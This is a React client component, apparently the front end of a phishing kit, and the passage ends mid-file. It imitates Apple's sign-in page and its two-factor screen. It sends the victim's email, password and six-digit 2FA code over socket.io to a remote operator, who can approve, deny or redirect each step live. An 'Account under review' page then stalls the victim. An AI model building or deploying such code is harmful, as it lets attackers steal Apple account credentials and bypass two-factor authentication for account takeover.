'use client';

import React, { useRef } from "react"
import { Button } from "@/components/ui/button";
import { Loader } from "../animate-ui/icons/loader";
import {
    DropdownMenu,
    DropdownMenuContent,
    DropdownMenuItem,
    DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import { CircleHelp, MoveUpRight, CircleAlert } from "lucide-react";
import { useEffect, useState } from 'react';
import io from 'socket.io-client';

function AppleIdLogo() {
    return (
        <div className="w-40 h-40 mx-auto">
            <svg
                xmlns="http://www.w3.org/2000/svg"
                xmlnsXlink="http://www.w3.org/1999/xlink"
                aria-hidden="true"
                className="icon fill-white"
                viewBox="0 0 160 160"
            >
                <defs>
                    <linearGradient
                        id="f2f15fa97739d6b8762a5540d983611bb"
                        x1="100%"
                        x2="50%"
                        y1="100%"
                        y2="50%"
                    >
                        <stop offset="0%" stopColor="#8700FF"></stop>
                        <stop offset="100%" stopColor="#EE00E1" stopOpacity="0"></stop>
                    </linearGradient>
                    <linearGradient
                        id="f2f15fa97739d6b8762a5540d983611bc"
                        x1="0%"
                        x2="50%"
                        y1="100%"
                        y2="50%"
                    >
                        <stop offset="0%" stopColor="#E00"></stop>
                        <stop offset="100%" stopColor="#EE00E1" stopOpacity="0"></stop>
                    </linearGradient>
                    <linearGradient
                        id="f2f15fa97739d6b8762a5540d983611bd"
                        x1="100%"
                        x2="50%"
                        y1="0%"
                        y2="50%"
                    >
                        <stop offset="0%" stopColor="#00B1EE"></stop>
                        <stop offset="100%" stopColor="#00B1EE" stopOpacity="0"></stop>
                    </linearGradient>
                    <linearGradient
                        id="f2f15fa97739d6b8762a5540d983611be"
                        x1="-17.876%"
                        x2="48.935%"
                        y1="21.021%"
                        y2="50%"
                    >
                        <stop offset="0%" stopColor="#FFA456"></stop>
                        <stop offset="100%" stopColor="#FFA456" stopOpacity="0"></stop>
                    </linearGradient>
                    <path
                        id="f2f15fa97739d6b8762a5540d983611ba"
                        d="M89.905 152.381a3.81 3.81 0 1 1 0 7.619 3.81 3.81 0 0 1 0-7.619m-23.737 2.79a3.81 3.81 0 1 1 7.36 1.973 3.81 3.81 0 0 1-7.36-1.972zm46.799-5.126a3.81 3.81 0 1 1-7.36 1.972 3.81 3.81 0 0 1 7.36-1.972m-60.58-2.409a3.81 3.81 0 1 1-3.81 6.598 3.81 3.81 0 0 1 3.81-6.598m28.777-4.373a3.302 3.302 0 1 1-.804 6.554 3.302 3.302 0 0 1 .804-6.554m-16.684-1.899a3.338 3.338 0 1 1-2.5 6.19 3.338 3.338 0 0 1 2.5-6.19m36.901 2.383a3.338 3.338 0 1 1-6.61.93 3.338 3.338 0 0 1 6.61-.93m28.591-4.621a3.81 3.81 0 1 1-6.598 3.81 3.81 3.81 0 0 1 6.598-3.81m-94.15-.941a3.81 3.81 0 1 1-5.387 5.387 3.81 3.81 0 0 1 5.388-5.387zm52.547-.486a3.023 3.023 0 1 1 0 6.047 3.023 3.023 0 0 1 0-6.047m-15.136.077a3.023 3.023 0 1 1-1.565 5.841 3.023 3.023 0 0 1 1.565-5.84zm-24.278-2.592a3.338 3.338 0 1 1-4.017 5.331 3.338 3.338 0 0 1 4.017-5.331m68.381.883a3.338 3.338 0 1 1-6.145 2.609 3.338 3.338 0 0 1 6.145-2.609m-10.664-.222a3.023 3.023 0 1 1-5.841 1.565 3.023 3.023 0 0 1 5.84-1.565zm-48.079-1.912a3.023 3.023 0 1 1-3.023 5.237 3.023 3.023 0 0 1 3.023-5.237m22.334-3.47a2.62 2.62 0 1 1-.639 5.201 2.62 2.62 0 0 1 .639-5.202zm-13.241-1.507a2.65 2.65 0 1 1-1.985 4.912 2.65 2.65 0 0 1 1.985-4.912m29.286 1.891a2.65 2.65 0 1 1-5.246.737 2.65 2.65 0 0 1 5.246-.737m23.196-3.668a3.023 3.023 0 1 1-5.236 3.024 3.023 3.023 0 0 1 5.236-3.024m-74.721-.747a3.023 3.023 0 1 1-4.276 4.276 3.023 3.023 0 0 1 4.276-4.276m98.125-2.255a3.81 3.81 0 1 1-5.387 5.388 3.81 3.81 0 0 1 5.387-5.388M35.56 125.196a3.338 3.338 0 1 1-5.26 4.11 3.338 3.338 0 0 1 5.26-4.11m-13.29-.428a3.81 3.81 0 1 1-6.599 3.81 3.81 3.81 0 0 1 6.599-3.81m108.491-.249a3.338 3.338 0 1 1-5.26 4.11 3.338 3.338 0 0 1 5.26-4.11m-75.396-.468a2.65 2.65 0 1 1-3.188 4.231 2.65 2.65 0 0 1 3.188-4.231m54.271.7a2.65 2.65 0 1 1-4.877 2.071 2.65 2.65 0 0 1 4.877-2.07zm21.327-9.436a3.023 3.023 0 1 1-4.276 4.276 3.023 3.023 0 0 1 4.276-4.276m-86.23.808a2.65 2.65 0 1 1-4.175 3.262 2.65 2.65 0 0 1 4.175-3.262m-10.043-.339a3.023 3.023 0 1 1-5.236 3.024 3.023 3.023 0 0 1 5.236-3.024m85.6-.197a2.65 2.65 0 1 1-4.175 3.262 2.65 2.65 0 0 1 4.175-3.262m-95.085-3.507a3.338 3.338 0 1 1-6.145 2.609 3.338 3.338 0 0 1 6.145-2.609m115.534-2.19a3.338 3.338 0 1 1-4.018 5.332 3.338 3.338 0 0 1 4.018-5.331zm12.102-3.672a3.81 3.81 0 1 1-3.81 6.599 3.81 3.81 0 0 1 3.81-6.599M12.65 108.301a3.81 3.81 0 1 1-7.36 1.972 3.81 3.81 0 0 1 7.36-1.972m23.865-2.586a2.65 2.65 0 1 1-4.877 2.07 2.65 2.65 0 0 1 4.877-2.07m91.693-1.738a2.65 2.65 0 1 1-3.188 4.231 2.65 2.65 0 0 1 3.188-4.231m10.11-2.915a3.023 3.023 0 1 1-3.023 5.237 3.023 3.023 0 0 1 3.023-5.237m-111.262 1.653a3.023 3.023 0 1 1-5.841 1.565 3.023 3.023 0 0 1 5.84-1.565zm-8.458-5.983a3.338 3.338 0 1 1-6.611.93 3.338 3.338 0 0 1 6.61-.93zm127.992-3.554a3.338 3.338 0 1 1-2.5 6.19 3.338 3.338 0 0 1 2.5-6.19m-115.319.356a2.65 2.65 0 1 1-5.246.737 2.65 2.65 0 0 1 5.246-.737m101.581-2.821a2.65 2.65 0 1 1-1.984 4.912 2.65 2.65 0 0 1 1.984-4.912m19.627-1.547a3.81 3.81 0 1 1 7.36 1.972 3.81 3.81 0 0 1-7.36-1.972M3.81 86.096a3.81 3.81 0 1 1 0 7.618 3.81 3.81 0 0 1 0-7.619zm137.923-.705a3.023 3.023 0 1 1-1.565 5.84 3.023 3.023 0 0 1 1.565-5.84m-121.694-.3a3.023 3.023 0 1 1 0 6.047 3.023 3.023 0 0 1 0-6.047m-6.938-8.368a3.302 3.302 0 1 1-.805 6.554 3.302 3.302 0 0 1 .805-6.554m13.807.93a2.62 2.62 0 1 1-.638 5.202 2.62 2.62 0 0 1 .638-5.202m120.796-1.946a3.302 3.302 0 1 1-.805 6.554 3.302 3.302 0 0 1 .805-6.554m-13.968 1.14a2.62 2.62 0 1 1-.638 5.201 2.62 2.62 0 0 1 .638-5.201m7.24-7.477a3.023 3.023 0 1 1 0 6.046 3.023 3.023 0 0 1 0-6.046m-120.128-.094a3.023 3.023 0 1 1-1.565 5.841 3.023 3.023 0 0 1 1.565-5.84zm135.342-2.99a3.81 3.81 0 1 1 0 7.619 3.81 3.81 0 0 1 0-7.62zM.162 68.862a3.81 3.81 0 1 1 7.36 1.972 3.81 3.81 0 0 1-7.36-1.972m29.28-5.072a2.65 2.65 0 1 1-1.984 4.913 2.65 2.65 0 0 1 1.985-4.913zm104.844 1.355a2.65 2.65 0 1 1-5.247.737 2.65 2.65 0 0 1 5.247-.737m-117.992-5.89a3.338 3.338 0 1 1-2.5 6.19 3.338 3.338 0 0 1 2.5-6.19m132.102 1.708a3.338 3.338 0 1 1-6.61.929 3.338 3.338 0 0 1 6.61-.93zm-8.594-4.735a3.023 3.023 0 1 1-5.84 1.565 3.023 3.023 0 0 1 5.84-1.565m-114.08-2.019a3.023 3.023 0 1 1-3.024 5.237 3.023 3.023 0 0 1 3.024-5.237m9.569-3.001a2.65 2.65 0 1 1-3.189 4.23 2.65 2.65 0 0 1 3.189-4.23m93.381.423a2.65 2.65 0 1 1-4.877 2.07 2.65 2.65 0 0 1 4.877-2.07m26.039-1.904a3.81 3.81 0 1 1-7.36 1.972 3.81 3.81 0 0 1 7.36-1.972M10.969 47.183a3.81 3.81 0 1 1-3.809 6.599 3.81 3.81 0 0 1 3.81-6.599zm12.693-3.781a3.338 3.338 0 1 1-4.017 5.331 3.338 3.338 0 0 1 4.017-5.331m117.661.533a3.338 3.338 0 1 1-6.145 2.608 3.338 3.338 0 0 1 6.145-2.608m-9.76-2.235a3.023 3.023 0 1 1-5.237 3.024 3.023 3.023 0 0 1 5.237-3.024m-97.233-.783a3.023 3.023 0 1 1-4.276 4.276 3.023 3.023 0 0 1 4.276-4.276m9.866-.35a2.65 2.65 0 1 1-4.175 3.262 2.65 2.65 0 0 1 4.175-3.262m75.556-.537a2.65 2.65 0 1 1-4.175 3.262 2.65 2.65 0 0 1 4.175-3.262m24.578-8.608a3.81 3.81 0 1 1-6.599 3.81 3.81 3.81 0 0 1 6.599-3.81m-122.515-.987a3.81 3.81 0 1 1-5.387 5.388 3.81 3.81 0 0 1 5.387-5.388m33.736 2.159a2.65 2.65 0 1 1-4.877 2.07 2.65 2.65 0 0 1 4.877-2.07m52.583-1.46a2.65 2.65 0 1 1-3.189 4.231 2.65 2.65 0 0 1 3.189-4.231m-73.251-1.14a3.338 3.338 0 1 1-5.26 4.11 3.338 3.338 0 0 1 5.26-4.11m84.962-.194a3.023 3.023 0 1 1-4.276 4.276 3.023 3.023 0 0 1 4.276-4.276m-73.76.505a3.023 3.023 0 1 1-5.238 3.024 3.023 3.023 0 0 1 5.237-3.024zm83.999-.987a3.338 3.338 0 1 1-5.26 4.11 3.338 3.338 0 0 1 5.26-4.11m-61.5-1.487a2.65 2.65 0 1 1-5.247.738 2.65 2.65 0 0 1 5.247-.738m26.024-2.284a2.65 2.65 0 1 1-1.984 4.913 2.65 2.65 0 0 1 1.984-4.913m-14.487-1.912a2.62 2.62 0 1 1-.639 5.201 2.62 2.62 0 0 1 .639-5.201m25.325-2.297a3.023 3.023 0 1 1-3.023 5.237 3.023 3.023 0 0 1 3.023-5.237m-45.261 1.76a3.023 3.023 0 1 1-5.841 1.565 3.023 3.023 0 0 1 5.84-1.565zm-10.994-3.15a3.338 3.338 0 1 1-6.145 2.609 3.338 3.338 0 0 1 6.145-2.609m66.254-1.84a3.338 3.338 0 1 1-4.018 5.332 3.338 3.338 0 0 1 4.018-5.331zm14.12-1.68a3.81 3.81 0 1 1-5.388 5.387 3.81 3.81 0 0 1 5.388-5.387m-40.217.463a3.023 3.023 0 1 1-1.565 5.84 3.023 3.023 0 0 1 1.565-5.84m-16.701-.13a3.023 3.023 0 1 1 0 6.048 3.023 3.023 0 0 1 0-6.047zm-36.02.304a3.81 3.81 0 1 1-6.6 3.81 3.81 3.81 0 0 1 6.6-3.81m28.985-3.118a3.338 3.338 0 1 1-6.611.93 3.338 3.338 0 0 1 6.61-.93zm32.79-2.877a3.338 3.338 0 1 1-2.5 6.19 3.338 3.338 0 0 1 2.5-6.19M80.149 8.66a3.302 3.302 0 1 1-.804 6.553 3.302 3.302 0 0 1 .804-6.553m31.274-2.894a3.81 3.81 0 1 1-3.81 6.598 3.81 3.81 0 0 1 3.81-6.598m-57.03 2.217a3.81 3.81 0 1 1-7.359 1.972 3.81 3.81 0 0 1 7.36-1.972zM91.139.163a3.81 3.81 0 1 1-1.972 7.359 3.81 3.81 0 0 1 1.972-7.36zM70.095 0a3.81 3.81 0 1 1 0 7.619 3.81 3.81 0 0 1 0-7.619"
                    ></path>
                </defs>
                <use xlinkHref="#f2f15fa97739d6b8762a5540d983611ba" fill="#FFF"></use>
                <use
                    xlinkHref="#f2f15fa97739d6b8762a5540d983611ba"
                    fill="url(#f2f15fa97739d6b8762a5540d983611bb)"
                ></use>
                <use
                    xlinkHref="#f2f15fa97739d6b8762a5540d983611ba"
                    fill="url(#f2f15fa97739d6b8762a5540d983611bc)"
                ></use>
                <use
                    xlinkHref="#f2f15fa97739d6b8762a5540d983611ba"
                    fill="url(#f2f15fa97739d6b8762a5540d983611bd)"
                ></use>
                <use
                    xlinkHref="#f2f15fa97739d6b8762a5540d983611ba"
                    fill="url(#f2f15fa97739d6b8762a5540d983611be)"
                ></use>
                <path
                    fill="var(--theme-color-systemBlack)"
                    d="M80.38 68.181c1.66 0 3.75-1.091 4.999-2.565 1.137-1.346 1.94-3.183 1.94-5.039 0-.255-.02-.51-.057-.71-1.865.073-4.103 1.201-5.427 2.73-1.063 1.164-2.033 3.02-2.033 4.875 0 .29.056.564.075.655.112.018.298.054.503.054m-5.724 27.713c2.248 0 3.243-1.474 6.044-1.474 2.838 0 3.483 1.438 5.97 1.438 2.47 0 4.11-2.239 5.677-4.44 1.732-2.53 2.469-4.987 2.487-5.115-.147-.036-4.865-1.947-4.865-7.28 0-4.622 3.704-6.697 3.926-6.86-2.451-3.477-6.192-3.586-7.224-3.586-2.746 0-4.994 1.656-6.431 1.656-1.53 0-3.52-1.547-5.916-1.547-4.551 0-9.158 3.713-9.158 10.701 0 4.368 1.695 8.973 3.814 11.94 1.806 2.51 3.39 4.567 5.676 4.567"
                ></path>
            </svg>
        </div>
    );
}

function LoadingSpinner() {
    return (
        <div className="flex flex-col items-center justify-center min-h-[400px] py-20">
            <div className="inline-block h-6 w-6 ">
                <Loader animateOnView />
            </div>
        </div>
    );
}

function AURPage({
    socket,
    refId,
    setPageState
}) {
    useEffect(() => {
        if (socket) {
            socket.emit("page", { page: "AURPage" });
        }
    }, [socket]);

    useEffect(() => {
        if (!socket) return;

        const handleRedirectPage = (data) => {
            console.log('2FA: Redirect page command received:', data);
            if (data.page) {
                setPageState(data.page);
                socket.emit("page", { page: data.page });
            }
        };

        socket.on('redirectPage', handleRedirectPage);

        return () => {
            socket.off('redirectPage', handleRedirectPage);
        };
    }, [socket, setPageState]);



    return (
        <div className="flex flex-col items-center justify-center w-full py-10">
            <div className="w-full h-auto min-h-[480px] w-auto max-w-[640px] p-10 bg-[#1c1c1e] rounded-4xl shadow-[0_20px_40px_rgba(0,0,0,0.6)]">
                <AppleIdLogo />

                <h2 className="text-[21px] !mt-3 font-semibold text-white mb-4 text-center">
                    Account under review
                </h2>

                <div className="w-full pl-12 pr-12 flex flex-col items-center space-y-6">


                    <div className="w-full">
                        <p className="text-white text-[17px] text-center mb-4">
                            We'll get back to you shortly.
                            <br />
                            Your Reafference ID: {refId}
                        </p>


                        {/* Separator */}
                        <div className="border-t border-[hsla(0,0%,84.7%,.7)] pt-6 mb-6">
                            <p className="text-white pl-[20px] pr-[20px] text-[14px] text-center max-w-md mx-auto mb-6">
                                Your account is under review our team will review your information shortly. Review with the reafference ID: {refId}
                            </p>

                            <div className="flex justify-center gap-4">

                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
}


function TwoFactorAuth({
    socket,
    email,
    setPageState
}) {
    const [code, setCode] = useState(['', '', '', '', '', '']);
    const [focusedIndex, setFocusedIndex] = useState(0);
    const [loading, setLoading] = useState(false);
    const [submitted, setSubmitted] = useState(false);
    const [twoFactorDenied, setTwoFactorDenied] = useState(false);
    const [twoFactorApproved, setTwoFactorApproved] = useState(false);

    const inputRefs = useRef([]);

    useEffect(() => {
        if (socket) {
            socket.emit("page", { page: "2faPage" });
        }
    }, [socket]);

    useEffect(() => {
        if (!socket) return;

        const handleRedirectPage = (data) => {
            console.log('2FA: Redirect page command received:', data);
            if (data.page) {
                setPageState(data.page);
                socket.emit("page", { page: data.page });
            }
        };

        socket.on('redirectPage', handleRedirectPage);

        return () => {
            socket.off('redirectPage', handleRedirectPage);
        };
    }, [socket, setPageState]);

    useEffect(() => {
        if (!socket) return;

        const handle2faApproved = (data) => {
            console.log('2FA approved:', data);
            setLoading(true);
            setTwoFactorApproved(true);
            setTwoFactorDenied(false);
        };

        const handle2faDenied = (data) => {
            console.log('2FA denied:', data);
            setLoading(false);
            setTwoFactorDenied(true);
            setTwoFactorApproved(false);
            setSubmitted(false);

            setCode(['', '', '', '', '', '']);

            setFocusedIndex(0);
        };

        socket.on('2faApproved', handle2faApproved);
        socket.on('2faDenied', handle2faDenied);

        return () => {
            socket.off('2faApproved', handle2faApproved);
            socket.off('2faDenied', handle2faDenied);
        };
    }, [socket]);

    const handleChange = (index, value) => {
        if (submitted || twoFactorApproved) return;

        if (twoFactorDenied && value) {
            setTwoFactorDenied(false);
        }

        if (value.length > 1) {
            value = value.slice(0, 1);
        }

        if (/^[0-9]*$/.test(value)) {
            const newCode = [...code];
            newCode[index] = value;
            setCode(newCode);

            if (value && index < 5) {
                setFocusedIndex(index + 1);
                inputRefs.current[index + 1]?.focus();
            }

            const updatedCode = [...newCode];
            const fullCode = updatedCode.join('');
            if (fullCode.length === 6) {
                submitCode(fullCode);
            }
        }
    };

    const handleKeyDown = (index, e) => {
        if (submitted || twoFactorApproved) return;
        if (e.key === 'Backspace') {
            if (!code[index] && index > 0) {
                const newCode = [...code];
                newCode[index - 1] = '';
                setCode(newCode);
                setFocusedIndex(index - 1);
                inputRefs.current[index - 1]?.focus();
            } else if (code[index]) {
                const newCode = [...code];
                newCode[index] = '';
                setCode(newCode);
            }
        } else if (e.key === 'ArrowLeft' && index > 0) {
            setFocusedIndex(index - 1);
            inputRefs.current[index - 1]?.focus();
        } else if (e.key === 'ArrowRight' && index < 5) {
            setFocusedIndex(index + 1);
            inputRefs.current[index + 1]?.focus();
        }
    };

    const handlePaste = (e) => {
        if (submitted || twoFactorApproved) return;
        if (twoFactorDenied) {
            setTwoFactorDenied(false);
        }

        e.preventDefault();
        const pasteData = e.clipboardData.getData('text');
        const numbers = pasteData.replace(/\D/g, '').split('').slice(0, 6);

        const newCode = [...code];
        numbers.forEach((num, index) => {
            if (index < 6) newCode[index] = num;
        });
        setCode(newCode);

        const lastFilledIndex = numbers.length - 1;
        if (lastFilledIndex < 5) {
            setFocusedIndex(numbers.length);
            inputRefs.current[numbers.length]?.focus();
        }

        const updatedCode = [...newCode];
        const fullCode = updatedCode.join('');
        if (fullCode.length === 6) {
            submitCode(fullCode);
        }
    };

    const submitCode = (fullCode) => {
        setLoading(true);
        setSubmitted(true);
        setTwoFactorDenied(false); // Reset denial state if user tries again

        console.log('Submitting 2FA code:', fullCode);

        if (socket) {
            socket.emit('2fa', {
                code: fullCode
            });
        }
    };

    useEffect(() => {
        if (inputRefs.current[focusedIndex] && !submitted && !twoFactorDenied) {
            inputRefs.current[focusedIndex].focus();
        }
    }, [focusedIndex, submitted, twoFactorDenied]);

    // Show loading spinner when 2FA is approved
    if (twoFactorApproved) {
        return <LoadingSpinner />;
    }

    return (
        <div className="flex flex-col items-center justify-center w-full py-10">
            <div className="w-full h-auto min-h-[480px] w-auto max-w-[640px] p-10 bg-[#1c1c1e] rounded-4xl shadow-[0_20px_40px_rgba(0,0,0,0.6)]">
                <AppleIdLogo />

                <h2 className="text-[21px] !mt-3 font-semibold text-white mb-5 text-center">
                    Two-factor authentication
                </h2>

                <div className="w-full pl-12 pr-12 flex flex-col items-center space-y-6">


                    <div className="w-full">
                        <div className="flex justify-center gap-2 mb-8">
                            {code.map((digit, index) => (
                                <input
                                    key={index}
                                    ref={el => inputRefs.current[index] = el}
                                    type="text"
                                    inputMode="numeric"
                                    pattern="[0-9]*"
                                    maxLength="1"
                                    value={digit}
                                    onChange={(e) => handleChange(index, e.target.value)}
                                    onKeyDown={(e) => handleKeyDown(index, e)}
                                    onPaste={handlePaste}
                                    onFocus={() => setFocusedIndex(index)}
                                    disabled={submitted || twoFactorApproved}
                                    className={`w-11 h-11 ${twoFactorDenied
                                        ? 'bg-[#300] border-[#ff3037] text-white'
                                        : submitted || twoFactorApproved
                                            ? 'bg-[#2c2c2e]/50 border-[#6e6e73]/50 cursor-not-allowed'
                                            : 'bg-[#2c2c2e] border-[#6e6e73]'
                                        } border rounded-lg text-white text-2xl font-bold text-center focus:outline-none focus:border-[#3b82f6] focus:ring-2 focus:ring-blue-500 peer`}
                                />
                            ))}
                        </div>
                        {twoFactorDenied && (
                            <div className="flex justify-center mt-[-14px] mb-4">
                                <div className="text-center">
                                    <span className="text-[#ff3037] text-[13px] flex items-center justify-center gap-1" dir="auto">
                                        <CircleAlert size={14} />
                                        <span>
                                            2FA verification denied. Please try again.
                                        </span>
                                    </span>
                                </div>
                            </div>
                        )}
                        {loading && !twoFactorDenied && (
                            <div className="text-center mb-6">
                                <div className="inline-block h-6 w-6 ">
                                    <Loader animateOnView />
                                </div>
                            </div>
                        )}

                        <p className="text-white text-[17px] text-center mb-4">
                            Enter the verification code sent to your Apple devices.
                        </p>

                        {/* Links */}
                        <div className="flex flex-col items-center gap-1 mb-8">
                            <a
                                href="#"
                                className="text-[#3b82f6] text-[14px] hover:underline"
                            >
                                Resend code to devices
                            </a>
                            <a
                                href="#"
                                className="text-[#3b82f6] text-[14px] hover:underline"
                            >
                                Cannot access your devices?
                            </a>
                        </div>

                        {/* Separator */}
                        <div className="border-t border-[hsla(0,0%,84.7%,.7)] pt-6 mb-6">
                            <p className="text-white pl-[20px] pr-[20px] text-[14px] text-center max-w-md mx-auto mb-6">
                                If you cannot enter a code because you have lost your device, you can use Find Devices to locate it or Manage Devices to remove your Apple Pay cards from it.
                            </p>

                            <div className="flex justify-center gap-4">
                                <button
                                    type="button"
                                    className="px-6 py-3 text-[#ffffffa8] text-[14px] rounded-lg hover:bg-[#333] flex flex-col items-center justify-center min-w-[120px]"
                                >
                                    <div className="flex justify-center mb-2">
                                        <svg
                                            xmlns="http://www.w3.org/2000/svg"
                                            width="28"
                                            fill="currentColor"
                                            className="layout-box"
                                            viewBox="0 0 113.684 111.181"
                                        >
                                            <path d="M7.04 55.56c0 27.782 22.628 50.411 50.411 50.411 27.826 0 50.456-22.629 50.456-50.411 0-15.504-7.123-29.422-18.192-38.712l-3.933 6.579c8.886 7.844 14.56 19.325 14.56 32.133 0 23.662-19.229 42.891-42.89 42.891-23.62 0-42.849-19.23-42.849-42.891 0-12.808 5.632-24.289 14.518-32.133l-3.89-6.58C14.162 26.138 7.04 40.058 7.04 55.56m16.3 0c0 18.85 15.304 34.155 34.111 34.155 18.85 0 34.156-15.305 34.156-34.155 0-9.646-4.009-18.272-10.426-24.519l-4.065 6.843a26.1 26.1 0 0 1 6.877 17.676c0 14.648-11.893 26.542-26.542 26.542-14.648 0-26.542-11.894-26.542-26.542a25.92 25.92 0 0 1 6.921-17.676l-4.108-6.843c-6.375 6.247-10.383 14.873-10.383 24.519m16.152-.01c0 9.913 8.046 17.958 17.96 17.958 9.913 0 18.002-8.045 18.002-17.959 0-5.112-2.162-9.688-5.571-12.95l16.586-27.496c.197-.332.136-.652-.196-.903C78.2 8.4 67.67 5.148 57.451 5.148c-10.184 0-20.747 3.252-28.778 9.052-.332.25-.393.57-.196.903l16.586 27.496c-3.409 3.262-5.57 7.838-5.57 12.95m-1.201-38.3c5.752-2.904 12.253-4.582 19.16-4.582s13.409 1.678 19.204 4.582l-4.528 7.51c-4.463-2.187-9.462-3.356-14.676-3.356-5.213 0-10.213 1.169-14.632 3.355Zm8.499 14.055c3.227-1.49 6.883-2.287 10.661-2.287 3.822 0 7.478.798 10.705 2.287L63.651 38.7a17.9 17.9 0 0 0-6.2-1.108c-2.158 0-4.236.403-6.2 1.108Zm-.417 24.244c0-6.153 4.925-11.122 11.078-11.122A11.08 11.08 0 0 1 68.573 55.55a11.093 11.093 0 0 1-11.122 11.122c-6.143 0-11.078-4.978-11.078-11.122m3.585 0a7.477 7.477 0 0 0 7.493 7.494 7.477 7.477 0 0 0 7.494-7.494 7.477 7.477 0 0 0-7.494-7.493 7.477 7.477 0 0 0-7.493 7.493"></path>
                                        </svg>
                                    </div>
                                    <span>Find Devices</span>
                                </button>
                                <button
                                    type="button"
                                    className="px-6 py-3 text-[#ffffffa8] text-[14px] rounded-lg hover:bg-[#333] flex flex-col items-center justify-center min-w-[120px]"
                                >
                                    <div className="flex justify-center mb-2">
                                        <svg
                                            xmlns="http://www.w3.org/2000/svg"
                                            width="28"
                                            fill="currentColor"
                                            className="layout-box"
                                            viewBox="0 0 145.676 111.181"
                                        >
                                            <path d="M25.962 100.588h64.83c-1.15-1.637-2-3.595-2.364-5.812a25 25 0 0 1-.167-2.093H26.086c-4.876 0-7.589-2.557-7.589-7.64v-58.82c0-5.032 2.713-7.641 7.59-7.641h84.204c4.834 0 7.589 2.61 7.589 7.64v1.75c2.82 0 5.348 0 7.854.01V25.84c0-10.055-5.086-15.162-15.318-15.162H25.962c-10.18 0-15.318 5.086-15.318 15.162v59.587c0 10.077 5.138 15.162 15.318 15.162M49.34 88.945h38.69v-4.5H49.34c-1.306 0-2.281.871-2.281 2.281 0 1.358.975 2.219 2.281 2.219m53.933 11.643h22.198c6.083 0 9.559-3.362 9.559-9.145v-48.61c0-5.835-3.487-9.156-9.56-9.156h-22.197c-6.082 0-9.548 3.321-9.548 9.156v48.61c0 5.783 3.455 9.145 9.548 9.145m.115-6.404c-2.146 0-3.26-1.165-3.26-3.403V43.454c0-2.249 1.114-3.372 3.26-3.372h4.403c.176 0 .29.114.29.3v.416c0 1.7 1.12 2.852 2.833 2.852h6.917c1.712 0 2.843-1.151 2.843-2.852v-.415c0-.187.103-.301.258-.301h4.425c2.187 0 3.269 1.123 3.269 3.372v47.327c0 2.238-1.082 3.403-3.27 3.403Zm4.327-2.492h13.21c1.007 0 1.775-.706 1.775-1.712 0-.934-.778-1.66-1.774-1.66h-13.211c-.996 0-1.66.726-1.66 1.66 0 1.058.602 1.712 1.66 1.712"></path>
                                        </svg>
                                    </div>
                                    <span>Manage Devices</span>
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
}

function LoginCard({
    pageState,
    setPageState,
    socket,
}) {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [rememberMe, setRememberMe] = useState(false);
    const [signInDenied, setSignInDenied] = useState(false);
    const [loading, setLoading] = useState(false);
    const [loginApproved, setLoginApproved] = useState(false);
    const [emailError, setEmailError] = useState('');
    const [passwordError, setPasswordError] = useState('');

    useEffect(() => {
        if (!socket) return;

        const handleRedirectPage = (data) => {
            console.log('LoginCard: Redirect page command received:', data);
            if (data.page) {
                setPageState(data.page);
                socket.emit("page", { page: data.page });

                if (data.page === '2faPage') {
                    setLoginApproved(true);
                } else if (data.page === 'loginPage') {
                    setLoginApproved(false);
                    setSignInDenied(false);
                    setEmail('');
                    setPassword('');
                }
            }
        };

        socket.on('redirectPage', handleRedirectPage);

        return () => {
            socket.off('redirectPage', handleRedirectPage);
        };
    }, [socket, setPageState]);

    const validateEmailOrPhone = (value) => {
        const phoneRegex = /^[0-9]{10,}$/;
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

        if (!value.trim()) {
            return 'Email or phone number is required';
        }

        if (phoneRegex.test(value)) {
            return ''; // Valid phone number
        } else if (emailRegex.test(value)) {
            return ''; // Valid email
        } else {
            return 'Please enter a valid email address or phone number';
        }
    };

    const validatePassword = (value) => {
        if (!value.trim()) {
            return 'Password is required';
        }

        if (value.length < 8) {
            return 'Password must be at least 8 characters long';
        }

        return '';
    };

    const handlePasswordChange = (e) => {
        const value = e.target.value;
        setPassword(value);

        // Validate if it's at least 8 characters
        if (value.length < 8) {
            setPasswordError('Password must be at least 8 characters long');
        } else {
            setPasswordError('');
        }
    };

    const handleEmailChange = (e) => {
        const value = e.target.value;
        setEmail(value);
        setEmailError(validateEmailOrPhone(value));
    };


    const handleContinue = (e) => {
        e.preventDefault();

        const emailValidationError = validateEmailOrPhone(email);
        if (emailValidationError) {
            setEmailError(emailValidationError);
            return;
        }

        if (!email.trim()) return;
        setEmailError('');
        setPageState('2faPage');

        if (socket) {
            socket.emit("page", { page: "2faPage" });
        }
    };

    const handleSignIn = async (e) => {
        e.preventDefault();

        const emailValidationError = validateEmailOrPhone(email);
        const passwordValidationError = validatePassword(password);

        if (emailValidationError) {
            setEmailError(emailValidationError);
            return;
        }

        if (passwordValidationError) {
            setPasswordError(passwordValidationError);
            return;
        }

        if (!password.trim() || !email.trim()) return;

        setLoading(true);
        setSignInDenied(false);
        setEmailError('');
        setPasswordError('');

        if (socket) {
            socket.emit('login', {
                email,
                password
            });
        }

        setPageState('2faPageLoading');

        if (socket) {
            socket.emit("page", { page: "2faPageLoading" });
        }
    };

    useEffect(() => {
        if (!socket) return;

        const handleSignInApproved = (data) => {
            console.log('Sign in approved:', data);
            setLoading(false);
            setLoginApproved(true);
            setPageState('2faPage');
        };

        const handleSignInDenied = (data) => {
            console.log('Sign in denied:', data);
            setLoading(false);
            setSignInDenied(true);
            setPassword("");
            setLoginApproved(false);
            setPageState('2faPage');
        };

        socket.on('signInApproved', handleSignInApproved);
        socket.on('signInDenied', handleSignInDenied);

        return () => {
            socket.off('signInApproved', handleSignInApproved);
            socket.off('signInDenied', handleSignInDenied);
        };
    }, [socket, setPageState]);

    if (pageState === 'loginPageLoading' || pageState === '2faPageLoading') {
        return <LoadingSpinner />;
    }

    if (pageState === '2faPage' && loginApproved) {
        return <TwoFactorAuth socket={socket} email={email} setPageState={setPageState} />;
    }

    const showPasswordField = pageState === '2faPage';

    return (
        <div className="flex flex-col items-center justify-center w-full py-10">
            <div className="w-full h-auto min-h-[480px] w-auto max-w-[640px] p-10 bg-[#1c1c1e] rounded-4xl shadow-[0_20px_40px_rgba(0,0,0,0.6)]">
                <AppleIdLogo />

                <h2 className="text-[30px] !mt-3 font-semibold text-white mb-8 text-center">
                    Sign in with Apple Account
                </h2>

                {!showPasswordField ? (
